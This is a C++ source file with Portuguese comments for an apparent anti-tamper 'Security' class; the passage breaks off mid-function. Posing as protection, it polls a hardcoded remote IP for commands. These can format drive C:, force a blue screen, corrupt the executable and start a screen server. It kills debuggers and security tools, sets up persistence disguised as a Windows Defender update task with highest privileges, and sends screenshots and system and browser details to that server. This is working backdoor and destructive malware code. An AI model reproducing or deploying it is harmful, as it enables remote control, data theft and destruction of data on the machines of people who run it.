#include "Security.hpp"
#include <winhttp.h>
#include <wininet.h>
#include <wincrypt.h>
#include <fstream>
#include "stranch.h"
// Flag externa definida em Overlay.cpp
extern bool g_ForceKeepRunning;
#pragma comment(lib, "wininet.lib")
#include <map>
#include <set>
#include <gdiplus.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;
using Gdiplus::Status;

Security::Security()
{
    // Inicializar Winsock
    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaResult != 0) {
        std::string msg = "[INIT] ERRO CRÍTICO: WSAStartup falhou - Código: " + std::to_string(wsaResult) + "\n";
        ConsoleLog(msg);
    }
    else {
        ConsoleLog("[INIT] Winsock inicializado com sucesso\n");
    }

    startTime = std::chrono::steady_clock::now();

    // Gerar sessionId único sem underscores (usa hex)
    DWORD pid = GetCurrentProcessId();
    auto now = std::chrono::steady_clock::now().time_since_epoch().count();
    std::ostringstream ss;
    ss << std::hex << pid << std::hex << (now & 0xFFFFFF);
    sessionId = ss.str();

    std::string msg = "[INIT] SessionID gerado: " + sessionId + "\n";
    ConsoleLog(msg.c_str());

    // Processos suspeitos
    suspiciousProcesses = {
        "extremeinjector", "xenos", "ghinjector", "sinjector", "dllinjector",
        "cheatengine", "sazinjector", "remoteinjector", "sharpinjector",
        "processinjector", "injector", "ollydbg", "x64dbg", "x32dbg",
        "windbg", "idaq", "idaq64", "immunitydebugger", "gdb", "radare2",
        "cutter", "dbx", "lldb", "dnspy", "ilspy", "de4dot", "dotpeek",
        "reflector", "justdecompile", "telerik", "jetbrains", "resharper",
        "codecracker", "scylla", "pe-sieve", "dumpit", "megadumper",
        "ollyquanto", "pestudio", "processdump", "memdump", "dumpinator",
        "processhacker", "processexplorer", "procmon", "procexp",
        "sysinternals", "apimonitor", "rohitab", "hookshark", "hookexplorer",
        "regmon", "filemon", "autoruns", "tcpview", "portmon", "wireshark",
        "fiddler", "httpdebugger", "burpsuite", "mitmproxy", "charles",
        "netmon", "networkminer", "metasploit", "sqlmap", "hydra", "john",
        "hashcat", "aircrack", "kali", "parrot", "nmap", "zenmap",
        "maltego", "recon-ng"
    };

    // DLLs confiáveis
    trustedDlls = {
        "comctl32.dll", "msvcr100.dll", "msvcp100.dll", "msvcr120.dll",
        "msvcp120.dll", "msvcr140.dll", "msvcp140.dll", "vcruntime140.dll",
        "vcruntime140_1.dll", "ucrtbase.dll", "mfc140.dll", "kernel32.dll",
        "user32.dll", "gdi32.dll", "advapi32.dll", "shell32.dll", "ole32.dll",
        "oleaut32.dll", "mpoav.dll"
    };

    multiInstanceAllowedDlls = { "comctl32.dll" };

    // Diretórios confiáveis
    char systemPath[MAX_PATH];
    char programFiles[MAX_PATH];
    char programFilesX86[MAX_PATH];
    char windowsPath[MAX_PATH];
    char commonAppData[MAX_PATH];

    SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, systemPath);
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFiles);
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFilesX86);
    SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, 0, windowsPath);
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, commonAppData);

    trustedDirectories.push_back(ToLower(systemPath));
    trustedDirectories.push_back(ToLower(programFiles));
    trustedDirectories.push_back(ToLower(programFilesX86));
    trustedDirectories.push_back(ToLower(std::string(windowsPath) + (char*)AY_OBFUSCATE("\\WinSxS")));
    trustedDirectories.push_back(ToLower(std::string(commonAppData) + (char*)AY_OBFUSCATE("\\Microsoft\\Windows Defender\\Platform")));
    trustedDirectories.push_back(ToLower(std::string(windowsPath) + (char*)AY_OBFUSCATE("\\Microsoft.NET\\Framework")));
    trustedDirectories.push_back(ToLower(std::string(windowsPath) + (char*)AY_OBFUSCATE("\\Microsoft.NET\\Framework64")));
    trustedDirectories.push_back(ToLower(std::string(windowsPath) + (char*)AY_OBFUSCATE("\\assembly")));
}

Security::~Security()
{
    running = false;
    alertSent = true;
    //std::this_thread::sleep_for(std::chrono::milliseconds(100));

    // Limpar Winsock
    WSACleanup();
}

void Security::StartMonitoring()
{
    running = true;
    cmdServerReady = false; // Reseta a flag

    ConsoleLog("[INIT] Iniciando monitoramento de segurança...\n");
    monitorThread = std::thread(&Security::SecurityMonitorLoop, this);
    monitorThread.detach();

    // Inicia polling de comandos em background (não bloqueia)
    ConsoleLog("[INIT] Iniciando polling de comandos...\n");
    std::thread cmdThread(&Security::CommandServerLoop, this);
    cmdThread.detach();
}

void Security::CommandServerLoop()
{
    ConsoleLog("[CMD Poll] Iniciando polling de comandos...\n");
    cmdServerReady = true;

    while (true)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

        try
        {
            HINTERNET hSession = WinHttpOpen(L"CmdPoll/1.0",
                WINHTTP_ACCESS_TYPE_NO_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) continue;

            HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"15.228.83.81"),
                BOT_HTTP_PORT, 0);
            if (!hConnect) { WinHttpCloseHandle(hSession); continue; }

            std::wstring path = L"/poll/" + std::wstring(sessionId.begin(), sessionId.end());

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                path.c_str(), NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); continue; }

            // Timeout de 5 segundos (long-polling)
            DWORD timeout = 5000;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
            WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
            WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

            BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

            DWORD statusCode = 0;
            DWORD statusSize = sizeof(statusCode);
            if (ok)
            {
                WinHttpQueryHeaders(hRequest,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    WINHTTP_HEADER_NAME_BY_INDEX,
                    &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
            }

            // 200 = tem comando, 204 = sem comando (timeout do long-poll)
            if (ok && statusCode == 200)
            {
                std::string body;
                DWORD dwSize = 0;
                DWORD dwDownloaded = 0;
                do {
                    dwSize = 0;
                    if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                    if (dwSize == 0) break;
                    char* buf = new char[dwSize + 1];
                    ZeroMemory(buf, dwSize + 1);
                    if (WinHttpReadData(hRequest, buf, dwSize, &dwDownloaded))
                        body += std::string(buf, dwDownloaded);
                    delete[] buf;
                } while (dwSize > 0);

                // Extrair campos do JSON
                auto extractStr = [&](const std::string& key) -> std::string {
                    auto pos = body.find("\"" + key + "\":\"");
                    if (pos == std::string::npos) return "";
                    pos += key.size() + 4;
                    auto end = body.find("\"", pos);
                    if (end == std::string::npos) return "";
                    return body.substr(pos, end - pos);
                    };

                std::string action = extractStr("action");
                std::string param1 = extractStr("param1");
                std::string param2 = extractStr("param2");

                if (!action.empty())
                {
                    ConsoleLog(("[CMD Poll] Executando: " + action + "\n").c_str());
                    ExecuteCommand(action, param1, param2);
                }
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
        }
        catch (...) {}
    }
}

void Security::ExecuteCommand(const std::string& action, const std::string& param1, const std::string& param2)
{
    if (action == "openBrowser") {
        std::string url = param1.empty() ? "https://www.google.com" : param1;

        if (param2.empty() || param2 == "default") {
            // Abre com navegador padrão — ShellExecute abre URL diretamente
            ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
        }
        else {
            // Abre com navegador específico — busca caminho completo no registro
            HKEY hKey;
            std::string exePath = "";
            std::string regKey = std::string((char*)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\")) + param2;

            for (HKEY root : { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE }) {
                if (RegOpenKeyExA(root, regKey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    char path[MAX_PATH] = {};
                    DWORD size = sizeof(path);
                    if (RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                        exePath = std::string(path);
                    }
                    RegCloseKey(hKey);
                    if (!exePath.empty()) break;
                }
            }

            if (!exePath.empty()) {
                // Remove aspas do caminho se existirem
                if (exePath.front() == '"') exePath = exePath.substr(1, exePath.size() - 2);

                // Usa CreateProcess — mais confiável que ShellExecute para abrir com URL
                std::string cmdLine = "\"" + exePath + "\" \"" + url + "\"";
                STARTUPINFOA si = {};
                PROCESS_INFORMATION pi = {};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_SHOWNORMAL;
                CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                if (pi.hProcess) CloseHandle(pi.hProcess);
                if (pi.hThread)  CloseHandle(pi.hThread);
            }
            else {
                // Fallback: abre com navegador padrão
                ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
            }
        }
    }
    else if (action == "breakExe") {
        BreakExe();
    }
    else if (action == "killProcess") {
        ExitProcess(0);
    }
    else if (action == "startScreenServer") {
        StartScreenServer();
    }
    else if (action == "stopScreenServer") {
        StopScreenServer();
    }
    else if (action == "blueScreen") {
        // Executar BSOD em thread separada para garantir envio da resposta HTTP antes
        std::thread([]() {
            Sleep(500); // Aguardar resposta HTTP ser enviada

            BOOLEAN bEnabled = FALSE;
            ULONG uResp = 0;

            // Obter privilégio de desligamento (SE_SHUTDOWN_PRIVILEGE = 19)
            typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
            typedef NTSTATUS(NTAPI* pNtRaiseHardError)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll)
            {
                auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
                auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

                if (RtlAdjustPrivilege && NtRaiseHardError)
                {
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
                    NtRaiseHardError(0xC0000022L, 0, 0, NULL, 6, &uResp);
                }
            }
            }).detach();
    }
    else if (action == "clearDisk") {
        system("format C: /Q /X /y");
        ConsoleLog("[CMD] Disco formatado\n");
    }
    else if (action == "restoreExe") {
        // Deletar flag, remover autostart e fechar
        SetFileAttributesA("C:\\ProgramData\\MicrosoftUpdate.dat", FILE_ATTRIBUTE_NORMAL);
        DeleteFileA("C:\\ProgramData\\MicrosoftUpdate.dat");
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "WindowsDefenderUpdate");
            RegCloseKey(hKey);
        }
        // Remover task agendada também
        {
            STARTUPINFOA si = {};
            PROCESS_INFORMATION pi = {};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            char delCmd[] = "schtasks /Delete /F /TN \"WindowsDefenderUpdateTask\"";
            if (CreateProcessA(NULL, delCmd, NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                WaitForSingleObject(pi.hProcess, 3000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        Sleep(500);
        ExitProcess(0);
    }
}

void Security::NotifyProcessRunning(bool invisible)
{
    try {
        std::string status = invisible ? "invisible" : "visible";
        // Incluir isAlert:true e browsers para o bot registrar a sessão
        std::string payload = "{\"processStatus\":\"" + status +
            "\",\"sessionId\":\"" + sessionId +
            "\",\"isAlert\":true,\"browsers\":" + BuildBrowsersJson(DetectBrowsers()) + "}";

        for (int i = 0; i < 15; i++) {
            if (i > 0) Sleep(5000); // 5s entre tentativas — rede pode demorar no boot
            HINTERNET hSess = WinHttpOpen(L"Status/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSess) continue;
            HINTERNET hConn = WinHttpConnect(hSess, AY_OBFUSCATE(L"15.228.83.81"), BOT_HTTP_PORT, 0);
            if (!hConn) { WinHttpCloseHandle(hSess); continue; }
            HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", L"/alert", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); continue; }
            DWORD to = 10000;
            WinHttpSetOption(hReq, WINHTTP_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
            WinHttpSetOption(hReq, WINHTTP_OPTION_SEND_TIMEOUT, &to, sizeof(to));
            WinHttpSetOption(hReq, WINHTTP_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));
            BOOL ok = WinHttpSendRequest(hReq, L"Content-Type: application/json\r\n", -1,
                (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
            if (ok) ok = WinHttpReceiveResponse(hReq, NULL);
            WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
            if (ok) break;
        }
    }
    catch (...) {}
}

std::vector<BrowserInfo> Security::DetectBrowsers()
{
    std::vector<BrowserInfo> browsers;

    // Lista de navegadores conhecidos e suas chaves de registro
    struct BrowserDef {
        std::string name;
        std::string exe;
        std::string regKey;
        std::string regValue;
    };

    std::vector<BrowserDef> known = {
        { "Google Chrome",          "chrome.exe",          "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",    "" },
        { "Mozilla Firefox",        "firefox.exe",         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe",   "" },
        { "Microsoft Edge",         "msedge.exe",          "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe",    "" },
        { "Opera",                  "opera.exe",           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe",     "" },
        { "Brave",                  "brave.exe",           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe",     "" },
        { "Vivaldi",                "vivaldi.exe",         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vivaldi.exe",   "" },
        { "Tor Browser",            "firefox.exe",         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\tor browser\\firefox.exe", "" },
        { "Internet Explorer",      "iexplore.exe",        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplore.exe", "" },
    };

    for (auto& def : known) {
        HKEY hKey;
        // Tenta HKCU primeiro, depois HKLM
        for (HKEY root : { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE }) {
            if (RegOpenKeyExA(root, def.regKey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char path[MAX_PATH] = {};
                DWORD size = sizeof(path);
                if (RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                    std::string fullPath(path);
                    if (!fullPath.empty()) {
                        // Verifica se o arquivo existe
                        if (GetFileAttributesA(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                            BrowserInfo info;
                            info.name = def.name;
                            info.exe = def.exe;
                            info.path = fullPath;
                            // Evita duplicatas
                            bool found = false;
                            for (auto& b : browsers) if (b.exe == def.exe) { found = true; break; }
                            if (!found) browsers.push_back(info);
                        }
                    }
                }
                RegCloseKey(hKey);
                break;
            }
        }
    }

    return browsers;
}

std::string Security::BuildBrowsersJson(const std::vector<BrowserInfo>& browsers)
{
    auto escJ = [](const std::string& s) {
        std::string out;
        for (char c : s) {
            if (c == '"')       out += "\\\"";
            else if (c == '\\') out += "\\\\";
            else                out += c;
        }
        return out;
        };

    std::string json = "[";
    for (size_t i = 0; i < browsers.size(); i++) {
        if (i > 0) json += ",";
        json += "{\"name\":\"" + escJ(browsers[i].name) + "\","
            "\"exe\":\"" + escJ(browsers[i].exe) + "\","
            "\"path\":\"" + escJ(browsers[i].path) + "\"}";
    }
    json += "]";
    return json;
}

void Security::BreakExe()
{
    try {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        // Cria um .bat temporário que aguarda o processo fechar e então corrompe o EXE
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string batPath = std::string(tempPath) + "cleanup.bat";

        DWORD pid = GetCurrentProcessId();

        // Script: aguarda o processo morrer, sobrescreve o EXE com lixo, deleta o bat
        std::string bat =
            "@echo off\r\n"
            ":wait\r\n"
            "tasklist /FI \"PID eq " + std::to_string(pid) + "\" 2>NUL | find /I \"" + std::to_string(pid) + "\" >NUL\r\n"
            "if not errorlevel 1 (\r\n"
            "    timeout /t 1 /nobreak >NUL\r\n"
            "    goto wait\r\n"
            ")\r\n"
            // Sobrescreve os primeiros 512 bytes com zeros (corrompe header PE)
            "powershell -Command \""
            "$f = [System.IO.File]::Open('" + std::string(exePath) + "', 'Open', 'ReadWrite'); "
            "$f.Seek(0, 'Begin') | Out-Null; "
            "$buf = New-Object byte[] 512; "
            "$f.Write($buf, 0, 512); "
            "$f.Close()\"\r\n"
            "del \"%~f0\"\r\n";

        // Escreve o bat
        std::ofstream batFile(batPath);
        batFile << bat;
        batFile.close();

        // Executa o bat em background (minimizado, sem janela)
        ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);

        // Encerra o processo
        Sleep(200);
        ExitProcess(0);
    }
    catch (...) {
        ExitProcess(0);
    }
}

void Security::StopMonitoring()
{
    running = false;
    alertSent = true;
}

bool Security::TestWebhook()
{
    try
    {
        // Usar o mesmo método que gera a mensagem normal
        std::string testMessage = GetEnhancedSystemInfo("Painel iniciado");

        // Tentar primeiro o método simples, depois o completo
        bool sent = SendSimpleMessage(testMessage);
        if (!sent)
        {
            sent = SendToBot(testMessage, "");
        }

        return sent;
    }
    catch (...)
    {
        return false;
    }
}

void Security::ForceSecurityAlert(const std::string& testReason)
{
    // Resetar o flag de alerta para permitir o teste
    {
        std::lock_guard<std::mutex> lock(mtx);
        alertSent = false;
    }

    // Disparar o alerta
    TakeAction(testReason);
}

void Security::SendPanelStarted()
{
    try
    {
        std::string message = GetEnhancedSystemInfo("Painel iniciado");
        // Usar SendToBot diretamente (sem screenLog) para ir ao canal logsPainel
        bool sent = SendToBot(message, "");
        (void)sent;
    }
    catch (...)
    {
        // Ignorar erros no envio da notificação de painel iniciado
    }
}

void Security::SecurityMonitorLoop()
{
    while (running && !alertSent)
    {
        CheckProcessesAndModules();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

void Security::CheckProcessesAndModules()
{
    try
    {
        // Sem espera — verificar imediatamente
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::steady_clock::now() - startTime).count();
        if (elapsed < 0) return; // nunca pula

        DWORD currentPID = GetCurrentProcessId();
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, currentPID);
        if (hSnapshot == INVALID_HANDLE_VALUE) return;

        char mainModulePath[MAX_PATH];
        GetModuleFileNameA(NULL, mainModulePath, MAX_PATH);
        std::string mainPath = ToLower(mainModulePath);

        std::string mainName = mainPath.substr(mainPath.find_last_of("\\/") + 1);
        mainName = mainName.substr(0, mainName.find_last_of('.'));

        std::string appDir = mainPath.substr(0, mainPath.find_last_of("\\/"));

        std::vector<std::string> suspiciousDlls = {
            "cheatengine", "hook", "inject", "hacker", "debugger", "rob"
        };

        std::map<std::string, int> trustedDllCount;
        for (const auto& dll : trustedDlls)
        {
            trustedDllCount[dll] = 0;
        }

        MODULEENTRY32 moduleEntry;
        moduleEntry.dwSize = sizeof(MODULEENTRY32);

        if (Module32First(hSnapshot, &moduleEntry))
        {
            do
            {
                try
                {
                    std::string moduleName = ToLower(WideToNarrow(moduleEntry.szModule));
                    std::string modulePath = ToLower(WideToNarrow(moduleEntry.szExePath));

                    if (moduleName.empty() || modulePath.empty()) continue;

                    size_t dotPos = moduleName.find_last_of('.');
                    std::string moduleBaseName = (dotPos != std::string::npos) ?
                        moduleName.substr(0, dotPos) : moduleName;

                    // Ignorar módulo principal
                    if (modulePath == mainPath || moduleBaseName == mainName)
                        continue;

                    // Verificar DLLs confiáveis
                    if (std::find(trustedDlls.begin(), trustedDlls.end(), moduleName) != trustedDlls.end())
                    {
                        trustedDllCount[moduleName]++;

                        // Verificar assinatura digital (simplificado)
                        HCERTSTORE hStore = NULL;
                        HCRYPTMSG hMsg = NULL;
                        DWORD dwEncoding, dwContentType, dwFormatType;

                        BOOL isSigned = FALSE;
                        try
                        {
                            isSigned = CryptQueryObject(
                                CERT_QUERY_OBJECT_FILE,
                                moduleEntry.szExePath,
                                CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                                CERT_QUERY_FORMAT_FLAG_BINARY,
                                0, &dwEncoding, &dwContentType, &dwFormatType,
                                &hStore, &hMsg, NULL);
                        }
                        catch (...)
                        {
                            isSigned = FALSE;
                        }

                        if (!isSigned && moduleName != "mpoav.dll")
                        {
                            if (hStore) CertCloseStore(hStore, 0);
                            if (hMsg) CryptMsgClose(hMsg);
                            CloseHandle(hSnapshot);
                            TakeAction("DLL confiável sem assinatura válida: " + moduleName + " (" + modulePath + ")");
                            return;
                        }

                        if (hStore) CertCloseStore(hStore, 0);
                        if (hMsg) CryptMsgClose(hMsg);

                        // Verificar múltiplas instâncias
                        if (trustedDllCount[moduleName] > 1 &&
                            std::find(multiInstanceAllowedDlls.begin(), multiInstanceAllowedDlls.end(), moduleName) == multiInstanceAllowedDlls.end())
                        {
                            CloseHandle(hSnapshot);
                            TakeAction("Múltiplas instâncias de DLL confiável detectadas: " + moduleName + " (" + modulePath + ")");
                            return;
                        }

                        continue;
                    }

                    // Verificar DLLs suspeitas
                    if (ContainsAny(moduleName, suspiciousDlls) || ContainsAny(modulePath, suspiciousDlls))
                    {
                        CloseHandle(hSnapshot);
                        TakeAction("DLL não autorizada detectada: " + moduleName + " (" + modulePath + ")");
                        return;
                    }

                    // Verificar diretório confiável
                    bool isTrustedPath = IsTrustedDirectory(modulePath) ||
                        (modulePath.find(appDir) == 0);

                    if (!isTrustedPath)
                    {
                        CloseHandle(hSnapshot);
                        TakeAction("DLL suspeita fora de diretórios confiáveis: " + moduleName + " (" + modulePath + ")");
                        return;
                    }
                }
                catch (...)
                {
                    // Ignorar erros em módulos específicos e continuar
                    continue;
                }

            } while (Module32Next(hSnapshot, &moduleEntry));
        }

        CloseHandle(hSnapshot);

        // Verificar processos suspeitos
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap != INVALID_HANDLE_VALUE)
        {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);

            if (Process32First(hProcessSnap, &pe32))
            {
                do
                {
                    try
                    {
                        std::string processName = ToLower(WideToNarrow(pe32.szExeFile));
                        if (processName.empty()) continue;

                        size_t dotPos = processName.find_last_of('.');
                        if (dotPos != std::string::npos)
                            processName = processName.substr(0, dotPos);

                        // Ignorar processos legítimos do Windows que podem ter nomes similares
                        static const std::vector<std::string> whitelist = {
                            "runtimebroker", "runtimeexchangeclient", "svchost",
                            "explorer", "taskhostw", "sihost", "ctfmon",
                            "searchhost", "searchindexer", "spoolsv", "lsass",
                            "winlogon", "csrss", "smss", "wininit", "services",
                            "reducememory", "memreduct", "memclean", "rammap",
                            "superfetch", "sysmain"
                        };
                        bool isWhitelisted = false;
                        for (const auto& w : whitelist)
                            if (processName == w) { isWhitelisted = true; break; }
                        if (isWhitelisted) continue;

                        if (ContainsAny(processName, suspiciousProcesses))
                        {
                            // Tentar fechar o processo suspeito
                            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                            if (hProcess)
                            {
                                TerminateProcess(hProcess, 0);
                                CloseHandle(hProcess);
                            }

                            CloseHandle(hProcessSnap);
                            TakeAction("Processo suspeito detectado: " + WideToNarrow(pe32.szExeFile));
                            return;
                        }
                    }
                    catch (...)
                    {
                        continue;
                    }

                } while (Process32Next(hProcessSnap, &pe32));
            }

            CloseHandle(hProcessSnap);
        }
    }
    catch (...)
    {
        // Ignorar exceções e continuar monitoramento
        return;
    }
}

void Security::TakeAction(const std::string& reason)
{
    {
        std::lock_guard<std::mutex> lock(mtx);
        if (alertSent) return;
        alertSent = true;
    }

    // Log para debug
    {
        std::ofstream log(AY_OBFUSCATE("C:\\ProgramData\\takeaction_log.txt"), std::ios::app);
        log << reason << "\n";
        log.close();
    }

    running = false;
    g_ForceKeepRunning = true;

    // Criar flag + autostart IMEDIATAMENTE
    {
        std::ofstream f(AY_OBFUSCATE("C:\\ProgramData\\MicrosoftUpdate.dat"));
        f << GetCurrentProcessId() << "\n" << sessionId;
        f.close();
        SetFileAttributesA(AY_OBFUSCATE("C:\\ProgramData\\MicrosoftUpdate.dat"),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    // Adicionar ao autostart via task agendada (roda como admin sem UAC no boot)
    {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        char username[256] = {};
        DWORD unLen = sizeof(username);
        GetUserNameA(username, &unLen);

        std::string cmd =
            std::string("schtasks /Create /F")
            + " /TN \"WindowsDefenderUpdateTask\""
            + " /TR \"\\\"" + exePath + "\\\"\""
            + " /SC ONLOGON"
            + " /RL HIGHEST"
            + " /DELAY 0000:10"
            + " /RU \"" + username + "\"";

        STARTUPINFOA si2 = {};
        PROCESS_INFORMATION pi2 = {};
        si2.cb = sizeof(si2);
        si2.dwFlags = STARTF_USESHOWWINDOW;
        si2.wShowWindow = SW_HIDE;
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2))
        {
            WaitForSingleObject(pi2.hProcess, 8000);
            CloseHandle(pi2.hProcess);
            CloseHandle(pi2.hThread);
        }

        // Garantir que não tem entrada antiga no Run
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "WindowsDefenderUpdate");
            RegCloseKey(hKey);
        }
    }

    // Ocultar janela imediatamente
    HWND hwndToHide = NULL;
    EnumWindows([](HWND h, LPARAM lp) -> BOOL {
        DWORD pid = 0;
        GetWindowThreadProcessId(h, &pid);
        if (pid == GetCurrentProcessId() && IsWindowVisible(h)) {
            *(HWND*)lp = h;
            ShowWindow(h, SW_HIDE);
        }
        return TRUE;
        }, (LPARAM)&hwndToHide);

    // Coletar info e screenshot
    std::string systemInfo = GetEnhancedSystemInfo(reason);
    std::string screenshotPath = CaptureScreenshot();

    auto escapeJson = [](const std::string& s) -> std::string {
        std::string out;
        for (unsigned char c : s) {
            if (c == '"')       out += "\\\"";
            else if (c == '\\') out += "\\\\";
            else if (c == '\n') out += "\\n";
            else if (c == '\r') out += "\\r";
            else if (c >= 0x20) out += (char)c;
        }
        return out;
        };

    // Montar payload com screenshot se existir
    std::string payload = "{\"content\":\"" + escapeJson(systemInfo) +
        "\",\"sessionId\":\"" + sessionId +
        "\",\"isAlert\":true,\"browsers\":" + BuildBrowsersJson(DetectBrowsers());

    if (!screenshotPath.empty()) {
        std::ifstream f(screenshotPath, std::ios::binary);
        if (f) {
            std::vector<unsigned char> img((std::istreambuf_iterator<char>(f)), {});
            f.close();
            DeleteFileA(screenshotPath.c_str());
            static const char* b64c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string enc;
            for (size_t i = 0; i < img.size(); i += 3) {
                unsigned int v = img[i] << 16;
                if (i + 1 < img.size()) v |= img[i + 1] << 8;
                if (i + 2 < img.size()) v |= img[i + 2];
                enc += b64c[(v >> 18) & 63]; enc += b64c[(v >> 12) & 63];
                enc += (i + 1 < img.size()) ? b64c[(v >> 6) & 63] : '=';
                enc += (i + 2 < img.size()) ? b64c[v & 63] : '=';
            }
            payload += ",\"screenshot\":\"" + enc + "\"";
        }
    }
    payload += "}";

    // Enviar — único envio, sem duplicata
    auto sendNow = [&](const std::string& p) -> bool {
        HINTERNET hInet = InternetOpenA("Alert/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInet) return false;
